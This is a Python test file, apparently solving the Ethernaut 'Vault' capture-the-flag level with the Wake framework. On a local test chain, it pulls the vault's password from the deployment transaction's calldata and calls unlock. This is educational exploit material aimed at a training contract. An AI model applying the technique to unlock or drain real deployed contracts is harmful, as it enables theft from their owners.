from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv08_vault import Vault


@default_chain.connect()
def test_lv08():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv08()
    exploit_lv08(contract, default_chain)
    ethernaut.check_lv08(contract)

def exploit_lv08(contract: Vault, blockchain: Chain):
    # Problem: Blockchain is public, no data can be hidden
    # Training: Representation of blockchain inside the testing framework - in reality you use blockchain explorer

    # find the first block with non-zero transactions count
    block = next(block for block in blockchain.blocks if len(block.txs) > 0)
    # get that blocks first transaction and it's data
    txData = block.txs[0].data
    # get call data string => sub bytes between the transaction ending sequence and padding
    txEndSeq = txData.index(b"\x18\x00")
    padding  = txData.index(b"\x00\x00\x00\x00")
    key = txData[txEndSeq + len(b"\x18\x00") + 1: padding]

    print(f"Extracted key: {key}")
    
    # unlock the contract with extracted key
    contract.unlock(key)
